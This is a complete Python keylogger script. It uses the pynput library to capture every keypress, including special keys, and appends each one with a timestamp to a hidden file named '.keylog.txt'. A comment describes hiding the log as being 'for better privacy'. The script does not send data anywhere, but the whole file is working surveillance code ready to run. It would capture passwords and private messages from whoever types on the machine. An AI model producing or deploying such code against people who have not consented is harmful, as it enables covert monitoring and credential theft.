from pynput import keyboard
from datetime import datetime

# Log file (hidden for better privacy)
log_file = ".keylog.txt"

# Function that runs when key is pressed
def on_press(key):
    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, "a") as f:
        try:
            f.write(f"[{time_now}] {key.char}\n")
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(f"[{time_now}] [SPACE]\n")
            elif key == keyboard.Key.enter:
                f.write(f"[{time_now}] [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(f"[{time_now}] [TAB]\n")
            elif key == keyboard.Key.backspace:
                f.write(f"[{time_now}] [BACKSPACE]\n")
            else:
                f.write(f"[{time_now}] [{key.name.upper()}]\n")

# Start listening for keypresses
listener = keyboard.Listener(on_press=on_press)
listener.start()

print("✅ Keylogger is running... Press CTRL+C to stop.")
listener.join()
